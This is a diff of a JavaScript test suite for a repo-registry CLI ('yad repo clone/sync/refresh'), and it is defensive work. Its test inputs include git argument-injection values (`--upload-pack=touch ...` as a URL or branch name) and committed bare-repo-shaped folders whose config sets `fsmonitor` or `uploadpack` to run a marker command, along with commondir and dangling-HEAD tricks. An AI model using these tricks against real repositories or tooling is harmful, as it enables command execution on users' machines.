@@ -8545,7 +8545,7 @@ test('E112 approve: records one approval bound to the artifact, never advances, 
 test('E112 approve: `--by` is required and taken only as it would print; `--engagement` is verified or none', async () => {
   const { T, bytes } = localEpic();
   try {
-    for (const by of [undefined, true, '', ' bob', 'bob ', 'bo\nb', 'bob‮', 'b\u0007ob']) {
+    for (const by of [undefined, true, '', ' bob', 'bob ', 'bo\nb', 'bob\u202e', 'b\u0007ob']) {
       const r = await approve(T, { by });
       assert.equal(r.code, 1, JSON.stringify(by));
       assert.match(r.out, by == null || by === true ? /`--by <name>` is required/ : /`--by` must be a name as it would print/);
@@ -20451,7 +20451,11 @@ test('E70: no address anywhere in a line, a hint or --json; one login check per 
   assert.ok(!/b\.com/.test(JSON.stringify(protectionJSON(r))), 'the --json object too');
   r = readProtection({ platform: 'gitlab', gitUrl: 'a@b.com@gitlab.com:g/p.git', branch: 'main' }, { runner: fakePlatform({ authed: false }).runner, env: ON });
   l = protectionLine(r, { name: 'svc' });
-  assert.equal(l.hint, 'run `glab auth login --hostname a name with an @ in it`, then `yad doctor` again', 'the login hint names the host');
+  // Since E81 review 13 a host that is not a plain host name is never asked about or repeated: no login
+  // command is built from it.
+  assert.equal(r.kind, 'no-url');
+  assert.match(l.hint, /^fix `git_url`/);
+  assert.ok(!/b\.com/.test(`${l.message} ${l.hint}`));
   r = readProtection({ platform: 'bob@x.com', gitUrl: GH_URL, branch: 'main' }, { runner: f.runner, env: ON });
   assert.ok(!/x\.com/.test(protectionLine(r, { name: 'svc' }).message));
   ({ r } = glRead([[/\/approval_rules/, 200, [{ name: 'owner bob@x.com', approvals_required: 1, protected_branches: [] }]], [/\/protected_branches/, 200, []]]));
@@ -24061,7 +24065,7 @@ test('E1 every command answers --json with one envelope, ok matching its exit co
     ['review', 'context', '--repo', 'nope', '--pr', '1'], ['review', 'trailer', '--repo', 'nope', '--pr', '1', '--body', 'x'],
     ['review', 'nudge', '--repo', 'nope', '--pr', '1'],
     ['commit', '-m', 'x'], ['open-pr'], ['ship', '-m', 'x', '--dry-run'], ['checkpoint'], ['tidy', 'up'], ['tidy'], ['index'],
-    ['history'], ['history', 'show', 'EP-demo'], ['history', 'search', 'demo'], ['repo', 'list'], ['repo', 'refresh'], ['repo', 'sync'],
+    ['history'], ['history', 'show', 'EP-demo'], ['history', 'search', 'demo'], ['repo', 'list'], ['repo', 'refresh'], ['repo', 'sync'], ['repo', 'clone'],
     ['risk-map', 'check'], ['codeowners', 'check'], ['roster'], ['docs', 'list'], ['docs', 'sync'], ['thread'], ['thread', 'EP-demo'],
     ['reconcile'], ['hook', 'ledger-guard'], ['setup', '--solo', '--greenfield', '--monorepo'],
   ];
@@ -25587,9 +25591,10 @@ test('test files that print ok()/info() lines keep them off the runner stream (t
 function e79Env(T, extra = {}) {
   const cfg = path.join(T, 'empty-gitconfig');
   if (!fs.existsSync(cfg)) fs.writeFileSync(cfg, '');
-  return { ...GIT_ENV, GIT_CONFIG_GLOBAL: cfg, GIT_CONFIG_NOSYSTEM: '1', SDLC_NONINTERACTIVE: '1', YAD_NO_UPDATE_NOTIFIER: '1', NO_COLOR: '1', ...extra };
+  // The tests' remotes are bare repos on disk: registered-repo clones allow them only with this (E81 review 3).
+  return { ...GIT_ENV, GIT_CONFIG_GLOBAL: cfg, GIT_CONFIG_NOSYSTEM: '1', SDLC_NONINTERACTIVE: '1', YAD_NO_UPDATE_NOTIFIER: '1', NO_COLOR: '1', YAD_ALLOW_LOCAL_REMOTES: '1', ...extra };
 }
-const e79Yad = (T, cwd, args) => spawnSync(process.execPath, [path.join(ROOT, 'bin/yad.mjs'), ...args], { cwd, env: e79Env(T), encoding: 'utf8', timeout: 120_000 });
+const e79Yad = (T, cwd, args, extra = {}) => spawnSync(process.execPath, [path.join(ROOT, 'bin/yad.mjs'), ...args], { cwd, env: e79Env(T, extra), encoding: 'utf8', timeout: 120_000 });
 const e79Git = (T, cwd, ...a) => execFileSync('git', ['-c', 'user.name=Dev', '-c', 'user.email=dev@example.com', ...a], { cwd, env: e79Env(T), stdio: 'pipe' }).toString().trim();
 // A space in every E79 folder: a home folder like `C:\Users\Jane Doe` must work, and must not reach a message.
 const e79Tmp = () => fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'yad e79-')));
@@ -25609,6 +25614,7 @@ test('E79: folder names, the workspace name from a URL, and the printed remote s
   assert.ok(remoteSteps({ name: 'acme', platform: null }).includes('git remote add origin <your remote URL>'));
   assert.equal(shown('a\u001b[31mb\rc'), 'a [31mb c');
   assert.equal(shown('a\u009b31mb\u007fc\u00a0'), 'a 31mb c\u00a0', 'C1 and DEL too; not a printable character');
+  assert.equal(shown('a\u202eb\u2028c\u2066d'), 'a b c d', 'bidi controls and separators too (E81 review 9)');
 });
 
 test('E79: the clone step judges every registry entry, and one failure never stops the rest', async () => {
@@ -25624,16 +25630,16 @@ test('E79: the clone step judges every registry entry, and one failure never sto
     const calls = [];
     const clone = (url, target) => { calls.push([url, target]); return url.includes('broken') ? { ok: false, error: 'fatal: not found' } : { ok: true }; };
     const registry = { repos: [
-      { name: 'self', path: '.', git_url: 'u' },
-      { name: 'escape', path: '../../elsewhere', git_url: 'u' },
-      { name: 'there', path: '../there', git_url: 'u' },
-      { name: 'junk', path: '../junk', git_url: 'u' },
+      { name: 'self', path: '.', git_url: 'https://git.example/u.git' },
+      { name: 'escape', path: '../../elsewhere', git_url: 'https://git.example/u.git' },
+      { name: 'there', path: '../there', git_url: 'https://git.example/u.git' },
+      { name: 'junk', path: '../junk', git_url: 'https://git.example/u.git' },
       { name: 'nourl', path: '../nourl', git_url: null },
       { name: 'dash', path: '../dash', git_url: '--upload-pack=touch /tmp/x' },
-      { name: 'broken', path: '../broken', git_url: 'broken-url' },
-      { name: 'empty', path: '../empty', git_url: 'good-1' },
-      { name: 'nested', path: 'demo-repos/api', git_url: 'good-2' },
-      { name: 'nopath', git_url: 'u' },
+      { name: 'broken', path: '../broken', git_url: 'https://git.example/broken-url.git' },
+      { name: 'empty', path: '../empty', git_url: 'https://git.example/good-1.git' },
+      { name: 'nested', path: 'demo-repos/api', git_url: 'https://git.example/good-2.git' },
+      { name: 'nopath', git_url: 'https://git.example/u.git' },
     ] };
     const r = cloneMissingRepos(product, registry, { clone });
     assert.deepEqual(r.cloned.map((x) => x.name), ['empty', 'nested']);
@@ -25641,7 +25647,7 @@ test('E79: the clone step judges every registry entry, and one failure never sto
     assert.deepEqual(r.failed.map((x) => x.name), ['escape', 'junk', 'nourl', 'dash', 'broken', 'nopath']);
     assert.match(r.failed.find((x) => x.name === 'escape').reason, /outside the workspace/);
     assert.equal(r.failed.find((x) => x.name === 'broken').reason, 'fatal: not found');
-    assert.deepEqual(calls.map(([u]) => u), ['broken-url', 'good-1', 'good-2'], 'git runs only for the entries that passed');
+    assert.deepEqual(calls.map(([u]) => u), ['https://git.example/broken-url.git', 'https://git.example/good-1.git', 'https://git.example/good-2.git'], 'git runs only for the entries that passed');
     assert.equal(calls[2][1], path.join(product, 'demo-repos', 'api'));
   } finally { fs.rmSync(T, { recursive: true, force: true }); }
 });
@@ -25660,11 +25666,11 @@ test('E79 review 1: a link the Product commits cannot carry a clone outside, and
     const calls = [];
     const clone = (url, target) => { calls.push(target); fs.mkdirSync(target, { recursive: true }); return { ok: true }; };
     const r = cloneMissingRepos(product, { repos: [
-      { name: 'escape', path: 'evil/x', git_url: 'u' },
-      { name: 'through-file', path: '.sdlc/hub.json/x', git_url: 'u' },
-      { name: 'dangling', path: 'dangling/x', git_url: 'u' },
-      { name: 'linked', path: '../linked', git_url: 'u' },
-      { name: 'good', path: '../good', git_url: 'u' },
+      { name: 'escape', path: 'evil/x', git_url: 'https://git.example/u.git' },
+      { name: 'through-file', path: '.sdlc/hub.json/x', git_url: 'https://git.example/u.git' },
+      { name: 'dangling', path: 'dangling/x', git_url: 'https://git.example/u.git' },
+      { name: 'linked', path: '../linked', git_url: 'https://git.example/u.git' },
+      { name: 'good', path: '../good', git_url: 'https://git.example/u.git' },
     ] }, { clone });
     assert.deepEqual(r.failed.map((x) => x.name), ['escape', 'through-file', 'dangling']);
     assert.match(r.failed[0].reason, /a folder on its path is a link/);
@@ -25691,7 +25697,7 @@ test('E79 review 2: a registry path through a .git folder is never cloned or reg
     }
     for (const p of ['.', '../backend', '../.github', '../x.git', 'demo-repos/api']) assert.ok(!throughGitDir(product, p), p);
     const calls = [];
-    const r = cloneMissingRepos(product, { repos: bad.map((p, i) => ({ name: `b${i}`, path: p, git_url: 'u' })) }, { clone: (u, t) => { calls.push(t); return { ok: true }; } });
+    const r = cloneMissingRepos(product, { repos: bad.map((p, i) => ({ name: `b${i}`, path: p, git_url: 'https://git.example/u.git' })) }, { clone: (u, t) => { calls.push(t); return { ok: true }; } });
     assert.equal(r.failed.length, bad.length);
     assert.ok(r.failed.every((x) => /runs through a \.git folder/.test(x.reason)));
     assert.deepEqual(calls, [], 'git never ran');
@@ -25713,7 +25719,7 @@ test('E79 review 3: a link the Product commits to .git cannot carry a clone into
     fs.symlinkSync('../../../outside/newdir', path.join(T, 'ws', 'dangling'));
     const calls = [];
     const paths = ['g/hooks/pre-commit', 'g/modules/evil', 'g/hooks-new', 'g2/hooks/x', '../dangling', '../dangling/c'];
-    const r = cloneMissingRepos(product, { repos: paths.map((p, i) => ({ name: `l${i}`, path: p, git_url: 'u' })) }, { clone: (u, t) => { calls.push(t); return { ok: true }; } });
+    const r = cloneMissingRepos(product, { repos: paths.map((p, i) => ({ name: `l${i}`, path: p, git_url: 'https://git.example/u.git' })) }, { clone: (u, t) => { calls.push(t); return { ok: true }; } });
     assert.deepEqual(r.failed.map((x) => x.path), paths);
     assert.ok(r.failed.every((x) => /a folder on its path is a link/.test(x.reason)), JSON.stringify(r.failed));
     assert.deepEqual(calls, [], 'git never ran');
@@ -26215,5 +26221,684 @@ test('E80 review 3: a worktree or a repo nested in a registered repo is its own 
     const inRepo = JSON.parse(e79Yad(T, path.join(backend, 'src'), ['review', 'context']).stdout);
     assert.equal(inRepo.repo, 'backend');
     assert.equal(fs.realpathSync(inRepo.repoRoot), fs.realpathSync(backend));
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+// ---------- E81: detect and fetch missing repos (`yad repo clone`) ----------
+test('E81: judgeRepo says where each registry entry stands, before any git runs', { skip: process.platform === 'win32' && 'symlinks need privileges on Windows' }, async () => {
+  const { judgeRepo } = await import('./workspace.mjs');
+  const T = e79Tmp();
+  try {
+    const ws = path.join(T, 'ws');
+    const product = path.join(ws, 'product');
+    fs.mkdirSync(path.join(product, '.sdlc'), { recursive: true });
+    fs.mkdirSync(path.join(ws, 'backend', '.git'), { recursive: true });
+    // A folder shaped like a bare repo, as a Product could commit one: git run there reads its config.
+    for (const d of ['objects', 'refs']) fs.mkdirSync(path.join(product, 'bare', d), { recursive: true });
+    fs.writeFileSync(path.join(product, 'bare', 'HEAD'), 'ref: refs/heads/main\n');
+    fs.writeFileSync(path.join(product, 'bare', 'config'), '[core]\n\tbare = true\n\tfsmonitor = touch pwned\n');
+    // The person's own link, directly in the workspace; and a link the Product commits, to a real checkout.
+    fs.mkdirSync(path.join(T, 'src', 'web', '.git'), { recursive: true });
+    fs.symlinkSync(path.join(T, 'src', 'web'), path.join(ws, 'web'));
+    fs.symlinkSync('../backend', path.join(product, 'evil'));
+    const at = (p, extra = {}) => judgeRepo(product, { name: p, path: p, git_url: 'https://git.example/u.git', ...extra });
+    assert.equal(at('.').state, 'product');
+    assert.equal(at('../backend').state, 'present');
+    assert.equal(at('../backend').linked, undefined);
+    assert.equal(at('../web').state, 'present', 'the person\'s own link in the workspace folder');
+    assert.equal(at('../web').linked, undefined);
+    assert.equal(at('evil').state, 'present');
+    assert.equal(at('evil').linked, true, 'a link inside the Product\'s tree');
+    assert.equal(at('../api').state, 'missing');
+    assert.equal(at('../api').url, 'https://git.example/u.git');
+    assert.equal(at('bare').state, 'refused');
+    assert.match(at('bare').reason, /exists and is not a git repo/);
+    assert.match(at('../../out').reason, /outside the workspace/);
+    assert.match(at('../.git').reason, /\.git folder/);
+    assert.match(at('../api', { git_url: '' }).reason, /no git_url/);
+    assert.match(at('../api', { git_url: '-x' }).reason, /starts with "-"/);
+    assert.match(judgeRepo(product, { name: 'n' }).reason, /no path/);
+    assert.equal(judgeRepo(product, { name: 'a\u001bb', path: '../api', git_url: 'https://git.example/u.git' }).name, 'a b', 'shown in the terminal safely');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81: yad repo clone fetches a repo registered after the join, and never touches one already there', () => {
+  const T = e79Tmp();
+  try {
+    const { ws, product, backend } = e80Workspace(T);
+    const remotes = path.join(T, 'remotes');
+    fs.mkdirSync(remotes);
+    e79Git(T, remotes, 'init', '-q', '--bare', '-b', 'main', 'api.git');
+    const seed = path.join(T, 'seed');
+    e79Git(T, T, 'clone', '-q', path.join(remotes, 'api.git'), seed);
+    fs.writeFileSync(path.join(seed, 'f'), 'x');
+    e79Git(T, seed, 'add', '-A');
+    e79Git(T, seed, 'commit', '-qm', 'init');
+    e79Git(T, seed, 'push', '-q', 'origin', 'main');
+    // A teammate registers api after this machine joined.
+    const regFile = path.join(product, '.sdlc', 'repos.json');
+    const reg = JSON.parse(fs.readFileSync(regFile, 'utf8'));
+    reg.repos.push({ name: 'api', path: '../api', git_url: path.join(remotes, 'api.git'), default_branch: 'main' });
+    fs.writeFileSync(regFile, JSON.stringify(reg));
+    const backendHead = e79Git(T, backend, 'rev-parse', 'HEAD');
+
+    // Detect: repo list and doctor both say it, and name the command.
+    const list = e79Yad(T, product, ['repo', 'list', '--json']);
+    const listed = JSON.parse(list.stdout);
+    assert.equal(listed.repos.find((r) => r.name === 'api').state, 'missing');
+    assert.equal(listed.missing, 1);
+    assert.match(e79Yad(T, product, ['repo', 'list']).stdout, /api .*not cloned on this machine[\s\S]*yad repo clone/);
+    const doc = JSON.parse(e79Yad(T, product, ['doctor', '--json']).stdout);
+    const apiCheck = doc.checks.find((c) => c.id === 'repo:api');
+    assert.equal(apiCheck.status, 'warn');
+    assert.match(apiCheck.hint, /yad repo clone/);
+
+    // Fetch — from a code repo too (E80): the command finds the Product.
+    const r = e79Yad(T, backend, ['repo', 'clone', '--json']);
+    assert.equal(r.status, 0, r.stdout + r.stderr);
+    const answer = JSON.parse(r.stdout);
+    assert.deepEqual(answer.cloned.map((x) => x.name), ['api']);
+    assert.deepEqual(answer.present.map((x) => x.name), ['backend']);
+    assert.deepEqual(answer.failed, []);
+    assert.ok(fs.existsSync(path.join(ws, 'api', 'f')));
+    assert.equal(e79Git(T, backend, 'rev-parse', 'HEAD'), backendHead, 'the repo already there is not touched');
+    assert.equal(e79Git(T, backend, 'status', '--porcelain'), '');
+    assert.equal(fs.readFileSync(regFile, 'utf8'), JSON.stringify(reg), 'the shared registry is not written');
+
+    // A re-run has nothing to do; a repo it cannot clone exits 1 and the others still count.
+    const again = e79Yad(T, product, ['repo', 'clone']);
+    assert.equal(again.status, 0);
+    assert.match(again.stdout + again.stderr, /nothing missing/);
+    reg.repos.push({ name: 'gone', path: '../gone', git_url: path.join(remotes, 'missing.git') }, { name: 'local', path: '../local' });
+    fs.writeFileSync(regFile, JSON.stringify(reg));
+    const bad = e79Yad(T, product, ['repo', 'clone', '--json']);
+    assert.equal(bad.status, 1);
+    assert.deepEqual(JSON.parse(bad.stdout).failed.map((x) => x.name), ['gone', 'local']);
+    const doc2 = JSON.parse(e79Yad(T, product, ['doctor', '--json']).stdout);
+    assert.doesNotMatch(doc2.checks.find((c) => c.id === 'repo:local').hint, /run `yad repo clone`/, 'never "run X" for an entry X refuses');
+    assert.match(e79Yad(T, product, ['repo', 'clone', 'api']).stdout, /api is already on this machine/);
+    // One by name; an unknown name is refused.
+    assert.equal(e79Yad(T, product, ['repo', 'clone', 'nope']).status, 1);
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81: a registry that does not parse is said by every repo action, and refresh never writes over it', () => {
+  const T = e79Tmp();
+  try {
+    const { product } = e80Workspace(T);
+    const regFile = path.join(product, '.sdlc', 'repos.json');
+    fs.writeFileSync(regFile, '<<<<<<< HEAD\n{}\n');
+    for (const action of ['list', 'refresh', 'sync', 'clone']) {
+      const r = e79Yad(T, product, ['repo', action]);
+      assert.equal(r.status, 1, `${action}: ${r.stdout}${r.stderr}`);
+      assert.match(r.stdout + r.stderr, /repos\.json in the Product cannot be read/, action);
+      assert.doesNotMatch(r.stdout + r.stderr, /yad e81-|yad e79-/, `${action}: no absolute path`);
+    }
+    assert.equal(fs.readFileSync(regFile, 'utf8'), '<<<<<<< HEAD\n{}\n', 'refresh did not replace it with an empty list');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81: yad repo sync judges each entry first, and never hands git a branch name that is an option', { skip: process.platform === 'win32' && 'symlinks need privileges on Windows' }, () => {
+  const T = e79Tmp();
+  try {
+    const { product, backend } = e80Workspace(T);
+    for (const d of ['objects', 'refs']) fs.mkdirSync(path.join(product, 'bare', d), { recursive: true });
+    fs.writeFileSync(path.join(product, 'bare', 'HEAD'), 'ref: refs/heads/main\n');
+    fs.writeFileSync(path.join(product, 'bare', 'config'), '[core]\n\tbare = true\n');
+    fs.symlinkSync('../backend', path.join(product, 'evil'));
+    // Outside T, whose name holds a space: `touch` must be able to make it, or the check proves nothing.
+    const pwned = path.join(fs.realpathSync(os.tmpdir()), `yad-e81-pwned-${process.pid}`);
+    fs.rmSync(pwned, { force: true });
+    const regFile = path.join(product, '.sdlc', 'repos.json');
+    fs.writeFileSync(regFile, JSON.stringify({ repos: [
+      { name: 'backend', path: '../backend', default_branch: `--upload-pack=touch ${pwned}` },
+      { name: 'bare', path: 'bare', default_branch: 'main' },
+      { name: 'evil', path: 'evil', default_branch: 'trunk' },
+      { name: 'away', path: '../away', git_url: 'https://git.example/u.git' },
+    ] }));
+    // A real remote, so an `--upload-pack` that reached git would run.
+    e79Git(T, T, 'init', '-q', '--bare', 'origin.git');
+    e79Git(T, backend, 'remote', 'add', 'origin', path.join(T, 'origin.git'));
+    const r = e79Yad(T, product, ['repo', 'sync', '--json']);
+    const answer = JSON.parse(r.stdout);
+    assert.equal(answer.synced, 0, r.stdout);
+    for (const b of ['@{-1}', '+main', 'a..b']) {
+      const reg = JSON.parse(fs.readFileSync(regFile, 'utf8'));
+      reg.repos[0].default_branch = b;
+      fs.writeFileSync(regFile, JSON.stringify(reg));
+      assert.match(e79Yad(T, product, ['repo', 'sync', 'backend']).stdout, /not a plain branch name git accepts/, b);
+    }
+    const reg0 = JSON.parse(fs.readFileSync(regFile, 'utf8'));
+    reg0.repos[0].default_branch = `--upload-pack=touch ${pwned}`;
+    fs.writeFileSync(regFile, JSON.stringify(reg0));
+    assert.equal(answer.skipped, 4);
+    const text = e79Yad(T, product, ['repo', 'sync']).stdout;
+    assert.match(text, /backend .*default branch \(recorded, or origin\/HEAD\) is not a plain branch name git accepts/);
+    assert.match(text, /bare .*exists and is not a git repo/);
+    assert.match(text, /evil .*inside a repo, is a link/);
+    assert.match(text, /away .*not cloned on this machine/);
+    assert.ok(!fs.existsSync(pwned), 'the recorded name never reached git as an option');
+    assert.doesNotMatch(text, /fetch failed/, 'git fetch never ran');
+    // refresh and doctor never run git in the bare-shaped folder either.
+    const doc = JSON.parse(e79Yad(T, product, ['doctor', '--json']).stdout);
+    assert.equal(doc.checks.find((c) => c.id === 'repo:bare').status, 'fail');
+    assert.match(doc.checks.find((c) => c.id === 'repo:bare').message, /exists and is not a git repo/);
+    assert.match(e79Yad(T, product, ['repo', 'refresh', 'bare']).stdout, /bare: the folder exists and is not a git repo/);
+  } finally { fs.rmSync(T, { recursive: true, force: true }); fs.rmSync(path.join(fs.realpathSync(os.tmpdir()), `yad-e81-pwned-${process.pid}`), { force: true }); }
+});
+
+test('E81 review 1: a registered folder inside a checkout (the monorepo layout) is present; a bare-shaped one on its way is refused', () => {
+  const T = e79Tmp();
+  // Outside T, whose name holds a space, so the marker command can make it.
+  const marker = path.join(fs.realpathSync(os.tmpdir()), `yad-e81-fsmonitor-${process.pid}`);
+  fs.rmSync(marker, { force: true });
+  try {
+    const { product } = e80Workspace(T);
+    e79Git(T, product, 'init', '-q', '-b', 'main');
+    fs.mkdirSync(path.join(product, 'apps', 'web'), { recursive: true });
+    fs.writeFileSync(path.join(product, 'apps', 'web', 'index.js'), 'x');
+    // A folder the Product commits, shaped like a bare repo, with a config that runs a command.
+    const bare = path.join(product, 'apps', 'bare');
+    for (const d of ['objects', 'refs']) fs.mkdirSync(path.join(bare, d), { recursive: true });
+    fs.writeFileSync(path.join(bare, 'HEAD'), 'ref: refs/heads/main\n');
+    fs.writeFileSync(path.join(bare, 'config'), `[core]\n\tbare = true\n\tfsmonitor = touch ${marker}\n`);
+    fs.mkdirSync(path.join(bare, 'inner'));
+    e79Git(T, product, 'add', '-A');
+    e79Git(T, product, 'commit', '-qm', 'monorepo');
+    const regFile = path.join(product, '.sdlc', 'repos.json');
+    fs.writeFileSync(regFile, JSON.stringify({ repos: [
+      { name: 'web', path: 'apps/web' },
+      { name: 'bare', path: 'apps/bare' },
+      { name: 'inner', path: 'apps/bare/inner' },
+    ] }));
+    const doc = JSON.parse(e79Yad(T, product, ['doctor', '--json']).stdout);
+    const web = doc.checks.find((c) => c.id === 'repo:web');
+    assert.notEqual(web.status, 'fail', web.message);
+    for (const id of ['repo:bare', 'repo:inner']) {
+      const ck = doc.checks.find((c) => c.id === id);
+      assert.equal(ck.status, 'fail');
+      assert.match(ck.message, /entry named HEAD/);
+    }
+    const list = JSON.parse(e79Yad(T, product, ['repo', 'list', '--json']).stdout);
+    assert.deepEqual(list.repos.map((r) => r.state), ['no-pack', 'refused', 'refused']);
+    e79Yad(T, product, ['repo', 'sync']);
+    e79Yad(T, product, ['repo', 'refresh', 'bare']);
+    e79Yad(T, product, ['risk-map', 'check']);
+    assert.ok(!fs.existsSync(marker), 'git never ran in the bare-shaped folder');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); fs.rmSync(marker, { force: true }); }
+});
+
+test('E81 review 1: refresh skips a checkout behind a link the Product commits, and a pack or code-map path outside .sdlc/code-context', { skip: process.platform === 'win32' && 'symlinks need privileges on Windows' }, async () => {
+  const { codeContextPathOk } = await import('./workspace.mjs');
+  const { codeMapPathspecs } = await import('./repo-publish.mjs');
+  const T = e79Tmp();
+  try {
+    const { product } = e80Workspace(T);
+    fs.symlinkSync('../backend', path.join(product, 'evil'));
+    fs.mkdirSync(path.join(product, '.sdlc', 'code-context', 'x'), { recursive: true });
+    fs.writeFileSync(path.join(product, 'leak.md'), 'x');
+    fs.writeFileSync(path.join(product, '.sdlc', 'code-context', 'x', 'code-map.md'), 'x');
+    const regFile = path.join(product, '.sdlc', 'repos.json');
+    fs.writeFileSync(regFile, JSON.stringify({ repos: [
+      { name: 'evil', path: 'evil' },
+      { name: 'backend', path: '../backend', contextPack: '../../../pack.md' },
+      { name: 'b2', path: '../backend', codeMap: 'leak.md' },
+    ] }));
+    const out = e79Yad(T, product, ['repo', 'refresh']).stdout;
+    assert.match(out, /evil: a folder on its path, inside a repo, is a link/);
+    assert.match(out, /backend: its contextPack or codeMap is not a path under \.sdlc\/code-context\//);
+    assert.match(out, /b2: its contextPack or codeMap is not a path/);
+    assert.doesNotMatch(out, /packing with repomix/);
+    for (const bad of ['../x', '/etc/x', 'leak.md', '.sdlc/code-context/../../x', '.sdlc/code-context/.git/x', '.sdlc/code-context/GIT~1/x', 'C:/x', null, '']) {
+      assert.ok(!codeContextPathOk(product, bad), String(bad));
+    }
+    assert.ok(codeContextPathOk(product, '.sdlc/code-context/x/code-map.md'));
+    fs.symlinkSync(T, path.join(product, '.sdlc', 'code-context', 'lnk'));
+    assert.ok(!codeContextPathOk(product, '.sdlc/code-context/lnk/code-map.md'), 'a link on the way');
+    assert.deepEqual(codeMapPathspecs(product, { repos: [{ name: 'b2', codeMap: 'leak.md' }, { name: 'x' }, null] }), ['.sdlc/code-context/x/code-map.md', '.sdlc/repos.json'], 'leak.md is never staged');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81 review 1: an entry that is not an object is named by every repo action and doctor, never a crash', () => {
+  const T = e79Tmp();
+  try {
+    const { product } = e80Workspace(T);
+    const regFile = path.join(product, '.sdlc', 'repos.json');
+    fs.writeFileSync(regFile, JSON.stringify({ repos: [null, 5, { name: 'backend', path: '../backend', default_branch: null }] }));
+    for (const action of ['list', 'refresh', 'sync', 'clone']) {
+      const r = e79Yad(T, product, ['repo', action]);
+      assert.doesNotMatch(r.stdout + r.stderr, /yad failed|Cannot read/, action);
+      assert.match(r.stdout + r.stderr, /2 entries in \.sdlc\/repos\.json are not an object/, action);
+    }
+    // default_branch: null falls back as an absent one does — not refused as a bad name.
+    assert.doesNotMatch(e79Yad(T, product, ['repo', 'sync']).stdout, /not a branch name/);
+    const doc = e79Yad(T, product, ['doctor', '--json']);
+    assert.doesNotMatch(doc.stdout + doc.stderr, /Cannot read/);
+    assert.equal(JSON.parse(doc.stdout).checks.find((c) => c.id === 'repos:not-an-entry').status, 'fail');
+  } finally { fs.rmSync(T, { recursive: true, force: true }); }
+});
+
+test('E81 review 2: a folder holding any entry named HEAD is never walked through — a dangling HEAD link or a commondir file too', { skip: process.platform === 'win32' && 'symlinks need privileges on Windows' }, async () => {
+  const { judgeRepo } = await import('./workspace.mjs');
+  const T = e79Tmp();
+  const tmp = fs.realpathSync(os.tmpdir());
+  const markers = ['fsmonitor', 'uploadpack'].map((k) => path.join(tmp, `yad-e81-r2-${k}-${process.pid}`));
+  for (const m of markers) fs.rmSync(m, { force: true });
+  try {
+    const { product } = e80Workspace(T);
+    e79Git(T, product, 'init', '-q', '-b', 'main');
+    // (a) HEAD a link to nowhere — git still takes the folder for a repo — with a config that runs a command.
+    const web = path.join(product, 'apps', 'web');
+    for (const d of ['objects', 'refs']) { fs.mkdirSync(path.join(web, d), { recursive: true }); fs.writeFileSync(path.join(web, d, '.k'), ''); }
+    fs.symlinkSync('refs/heads/main', path.join(web, 'HEAD'));
+    fs.writeFileSync(path.join(web, 'config'), `[core]\n\tbare = false\n\tworktree = .\n\tfsmonitor = touch ${markers[0]}\n`);
+    // (b) HEAD with a commondir that points at objects and refs elsewhere, whose config sets uploadpack.
+    const cd = path.join(product, 'apps', 'cd');
+    fs.mkdirSync(cd, { recursive: true });
+    fs.writeFileSync(path.join(cd, 'HEAD'), 'ref: refs/heads/main\n');
+    fs.writeFileSync(path.join(cd, 'commondir'), '../../evil\n');
+    const evil = path.join(product, 'evil');
+    fs.mkdirSync(path.join(evil, 'objects'), { recursive: true });
+    fs.mkdirSync(path.join(evil, 'refs', 'heads'), { recursive: true });
+    fs.writeFileSync(path.join(evil, 'refs', 'heads', 'main'), `${'1'.repeat(40)}\n`);
+    fs.writeFileSync(path.join(evil, 'config'), `[remote "origin"]\n\turl = ${product}\n\tuploadpack = touch ${markers[1]}\n`);
+    e79Git(T, product, 'add', '-A');
+    e79Git(T, product, 'commit', '-qm', 'payloads');
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [
+      { name: 'web', path: 'apps/web', default_branch: 'main' },
+      { name: 'cd', path: 'apps/cd', default_branch: 'main' },
+      { name: 'deep', path: 'apps/web/objects', default_branch: 'main' },
+    ] }));
+    for (const p of ['apps/web', 'apps/cd', 'apps/web/objects']) {
+      const j = judgeRepo(product, { name: 'x', path: p });
+      assert.equal(j.state, 'refused', p);
+      assert.match(j.reason, /entry named HEAD/);
+    }
+    for (const args of [['repo', 'sync'], ['repo', 'list'], ['repo', 'refresh'], ['doctor'], ['risk-map', 'check'], ['codeowners', 'check']]) e79Yad(T, product, args);
+    for (const m of markers) assert.ok(!fs.existsSync(m), `${path.basename(m)}: no command ran`);
+  } finally { fs.rmSync(T, { recursive: true, force: true }); for (const m of markers) fs.rmSync(m, { force: true }); }
+});
+
+test('E81 review 2: a subfolder of a checkout behind the person\'s own workspace link is present; a Product link is not read by list', { skip: process.platform === 'win32' && 'symlinks need privileges on Windows' }, async () => {
+  const { judgeRepo } = await import('./workspace.mjs');
+  const { codeMapPathspecs, packPathspecs } = await import('./repo-publish.mjs');
+  const T = e79Tmp();
+  try {
+    const { ws, product } = e80Workspace(T);
+    const ext = path.join(T, 'ext', 'mono');
+    fs.mkdirSync(path.join(ext, 'apps', 'web'), { recursive: true });
+    e79Git(T, ext, 'init', '-q', '-b', 'main');
+    fs.symlinkSync(ext, path.join(ws, 'mono'));
+    assert.equal(judgeRepo(product, { name: 'm', path: '../mono' }).state, 'present');
+    const sub = judgeRepo(product, { name: 'w', path: '../mono/apps/web' });
+    assert.equal(sub.state, 'present', sub.reason);
+    assert.equal(sub.inside, path.join(ws, 'mono'));
+    // A link the Product commits: list names it and reads nothing, as sync and refresh skip it.
+    fs.symlinkSync('../mono', path.join(product, 'evil'));
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ name: 'evil', path: 'evil' }] }));
+    const row = JSON.parse(e79Yad(T, product, ['repo', 'list', '--json']).stdout).repos[0];
+    assert.equal(row.state, 'refused');
+    assert.match(row.reason, /is a link/);
+    // A nameless entry, or one whose name is not text, has no code-context place: skipped, never a throw.
+    const odd = { repos: [{ path: '../x' }, { name: 5, path: '../y' }] };
+    assert.deepEqual(codeMapPathspecs(product, odd), ['.sdlc/repos.json']);
+    assert.deepEqual(packPathspecs(product, odd), []);
+    fs.writeFileSync(path.join(product, '.sdlc', 'repos.json'), JSON.stringify({ repos: [{ path: '../mono' }, { name: 5, path: '../mono' }] }));
